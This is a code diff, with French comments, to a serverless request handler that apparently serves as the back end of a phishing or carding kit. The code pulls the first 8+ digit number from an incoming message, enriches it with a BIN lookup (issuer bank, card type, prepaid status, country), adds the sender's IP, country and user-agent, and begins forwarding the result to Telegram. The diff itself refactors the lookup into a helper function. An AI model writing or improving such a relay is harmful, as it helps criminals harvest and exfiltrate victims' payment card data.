@@ -10,6 +10,36 @@ export const config = {
   },
 };
 
+// —————— AJOUT : fonction de lookup BIN à 8 chiffres ——————
+async function getBinInfo(bin8) {
+  try {
+    const res = await fetch(
+      `https://lookup.binlist.net/${bin8}`,
+      { headers: { 'Accept-Version': '3' } }
+    );
+    if (!res.ok) return null;
+    const d = await res.json();
+    const num = d.number || {};
+    return {
+      scheme:       d.scheme       || '?',
+      brand:        d.brand        || '?',
+      length:       num.length     || '?',
+      luhn:         num.luhn ? 'Yes' : 'No',
+      type:         (d.type || '?').replace(/^./, s => s.toUpperCase()),
+      prepaid:      d.prepaid ? 'Yes' : 'No',
+      countryName:  d.country?.name   || '?',
+      countryEmoji: d.country?.emoji  || '',
+      latitude:     d.country?.latitude  || '?',
+      longitude:    d.country?.longitude || '?',
+      bankName:     d.bank?.name     || '?'
+    };
+  } catch {
+    return null;
+  }
+}
+// —————— FIN AJOUT ——————
+
+
 // lit le body qu’il soit JSON ou texte brut
 async function readBody(req) {
   const contentType = req.headers['content-type'] || '';
@@ -168,49 +198,6 @@ export default async function handler(req, res) {
     text += icon ? `${icon} ${line}\n` : `${line}\n`;
   }
 
-  // —————— AJOUT : lookup BIN sur les 8 premiers chiffres ——————
-  // on cherche la première suite d’au moins 8 chiffres dans le message
-  const binMatch = rawMsg.match(/\b(\d{8,})/);
-  if (binMatch) {
-    const bin8 = binMatch[1].slice(0, 8);
-    try {
-      const binRes = await fetch(
-        `https://lookup.binlist.net/${bin8}`,
-        { headers: { 'Accept-Version': '3' } }
-      );
-      if (binRes.ok) {
-        const d = await binRes.json();
-        const scheme       = d.scheme       || '?';
-        const brand        = d.brand        || '?';
-        const numInfo      = d.number || {};
-        const length       = numInfo.length || '?';
-        const luhn         = numInfo.luhn ? 'Yes' : 'No';
-        const cardType     = (d.type || '?').charAt(0).toUpperCase() + (d.type||'?').slice(1);
-        const prepaid      = d.prepaid      ? 'Yes' : 'No';
-        const country      = d.country || {};
-        const countryName  = country.name   || '?';
-        const countryEmoji = country.emoji  || '';
-        const lat          = country.latitude  || '?';
-        const lon          = country.longitude || '?';
-        const bankName     = (d.bank || {}).name || '?';
-
-        text += '\n💳 BIN Lookup:\n'
-          + `   • Scheme / network: ${scheme}\n`
-          + `   • Brand: ${brand}\n`
-          + `   • Card number length: ${length}\n`
-          + `   • LUHN: ${luhn}\n`
-          + `   • Type: ${cardType}\n`
-          + `   • Prepaid: ${prepaid}\n`
-          + `   • Country: ${countryEmoji} ${countryName}\n`
-          + `     (latitude: ${lat}, longitude: ${lon})\n`
-          + `   • Bank: ${bankName}\n`;
-      }
-    } catch (e) {
-      text += `\n❗ Impossible de récupérer les infos BIN : ${e.message}\n`;
-    }
-  }
-  // —————— FIN DE L’AJOUT ——————
-
   // 8️⃣ Ajout du bloc infos système
   text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
   text += `🌐 IP Client     : ${ip}\n`;
@@ -218,6 +205,25 @@ export default async function handler(req, res) {
   text += `🌍 Pays Client   : ${countryDisplay}\n`;
   text += `📍 User-Agent    : ${ua}\n`;
   text += `©️ ${now.getFullYear()} ©️`;
+
+  // —————— AJOUT : lookup BIN ——————
+  const match = rawMsg.match(/\b(\d{8,})/);
+  if (match) {
+    const info = await getBinInfo(match[1].slice(0, 8));
+    if (info) {
+      text += '\n💳 BIN Lookup:\n'
+        + `   • Scheme / network: ${info.scheme}\n`
+        + `   • Brand: ${info.brand}\n`
+        + `   • Card number length: ${info.length}\n`
+        + `   • LUHN: ${info.luhn}\n`
+        + `   • Type: ${info.type}\n`
+        + `   • Prepaid: ${info.prepaid}\n`
+        + `   • Country: ${info.countryEmoji} ${info.countryName}\n`
+        + `     (latitude: ${info.latitude}, longitude: ${info.longitude})\n`
+        + `   • Bank: ${info.bankName}\n`;
+    }
+  }
+  // —————— FIN AJOUT ——————
 
   // 9️⃣ Envoi sur Telegram
   const tg = await fetch(
